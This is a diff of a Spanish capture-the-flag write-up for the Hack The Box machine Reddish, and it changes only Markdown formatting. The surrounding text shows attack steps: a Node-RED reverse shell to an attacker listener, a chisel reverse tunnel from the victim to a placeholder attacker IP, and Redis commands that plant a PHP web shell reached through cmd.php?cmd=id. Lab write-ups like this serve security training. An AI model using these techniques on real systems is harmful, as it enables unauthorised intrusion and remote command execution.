@@ -3,6 +3,7 @@ title: "Hack The Box - Reddish"
 description: "Obtener acceso root en un entorno multi-contenedor que incluye Redis, Node-RED y Rsync."
 pubDate: 2025-08-26
 draft: false
+useMdTitle: true
 ---
 **IP:** `10.10.10.94`  
 **OS:** Linux (multi-container environment)  
@@ -10,7 +11,7 @@ draft: false
 
 ---
 
-## 🧭 Enumeración Inicial
+### 🧭 Enumeración Inicial
 ```bash
 curl -s -X POST http://10.10.10.94:1880/
 ```
@@ -18,7 +19,7 @@ Devuelve una estructura de flujo que sugiere acceso a **Node-RED** con ejecució
 
 ---
 
-## 🐚 Acceso Inicial
+## 🐚 Acceso Inicial 
 - Se usa el flujo de Node-RED para ejecutar una reverse shell apuntando a nuestro listener.
 - Dentro del contenedor, se observan dos interfaces de red: `172.18.0.2` y `172.19.0.4`.
 
@@ -38,8 +39,9 @@ Se detectan múltiples servicios accesibles:
 ```bash
 # En atacante:
 ./chisel server --reverse -p 1234
-
+```
 # En víctima:
+```bash
 ./chisel client <IP_ATACANTE>:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379
 ```
 
@@ -55,8 +57,9 @@ redis-cli config set dbfilename "cmd.php"
 redis-cli save
 ```
 Se obtiene ejecución remota de comandos por web:  
+```bash
 `http://<host>/cmd.php?cmd=id`
-
+```
 ---
 
 ## 🛠 Reverse Shell desde backup
